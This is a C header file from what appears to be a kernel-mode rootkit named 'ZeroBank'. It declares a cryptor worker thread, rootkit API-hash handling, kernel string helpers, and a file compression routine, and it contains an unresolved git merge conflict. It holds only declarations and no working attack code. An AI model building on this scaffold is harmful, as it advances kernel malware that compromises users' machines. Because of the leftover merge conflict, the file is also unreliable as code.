#pragma once

typedef struct _ZEROBANK_CRYPTOR_WORKER
{
	HANDLE WorkerThreadHandle;
	PROOTKIT_API_HASH Hash;
	PETHREAD pThread;
	BOOLEAN StopWorkerThread;
	KEVENT WorkerThreadEvent;

}ZEROBANK_CRYPTOR_WORKER, *PZERBANK_CRYPTOR_WORKER;

void *kimemcpy(void *dst, void *src, unsigned int size);
char *kistrcpy(char *dest, const char *src);
char *kistrcat(char *dest, const char *src);
size_t kistrlen(const char *s);
size_t kistrlenW(const wchar_t *s);
wchar_t __stdcall _RtlUpcaseUnicodeChar(IN wchar_t Source);
long __stdcall CompareUnicodeString(IN PCUNICODE_STRING String1, IN PCUNICODE_STRING String2, IN BOOLEAN CaseInSensitive);
void __stdcall _InitUnicodeString(PUNICODE_STRING String, PWCHAR Source);
BOOLEAN KiIsMdlAdddressValid(IN PMDL Mdl, IN PROOTKIT_API_HASH Hash);
VOID KiInitializeKernelModeThread(IN PHANDLE ThreadHandle, IN PROOTKIT_API_HASH Hash, IN PKSTART_ROUTINE Routine, IN PVOID Context OPTIONAL);
void LogFilterData(IN const char *szFormat, ...);

<<<<<<< HEAD
PUCHAR CompressZeroBankFile(IN PUCHAR Buffer, IN SIZE_T SizeOfBuffer, IN INT KeyType, OUT PULONG FinalCompressedSize, IN PROOTKIT_API_HASH Hash);
=======
PUCHAR CompressZeroBankFile(IN PUCHAR Buffer, IN SIZE_T SizeOfBuffer,OUT PULONG FinalCompressedSize, IN PROOTKIT_API_HASH Hash);
>>>>>>> adding files
VOID ZeroBankCryptorWorkRoutine(PVOID Context);
